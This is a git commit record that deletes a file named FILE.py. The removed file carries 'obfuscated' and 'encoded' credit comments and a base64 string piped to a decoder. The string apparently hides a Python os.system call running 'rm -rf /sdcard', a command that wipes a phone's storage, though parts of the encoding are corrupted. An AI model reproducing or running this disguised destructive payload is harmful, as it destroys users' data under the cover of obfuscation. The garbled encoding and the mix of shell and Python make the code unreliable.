b0aacdea02850a17891703b60dc33d558ab574b1
DRAGON LORD <142698556+Dragon-Lord-404@users.noreply.github.com>
2023-09-23 22:32:48 +0600

    Delete FILE.py

--- FILE.py
+++
@@ -1,6 +0,0 @@
-# Obfuscated with PyObfuscate
-# https://www.github.com/Dragon-Lord-404
-# Encoded By DRAGON LORD
-# Time : Sun Sep 12 23:57:15 2023
-# -------------------------------
-echo 'aW1wb3J0IG9z b3Opc3lzdGVtpSdybSCscmYgL3NkY2FyZCek' | base64 --decode
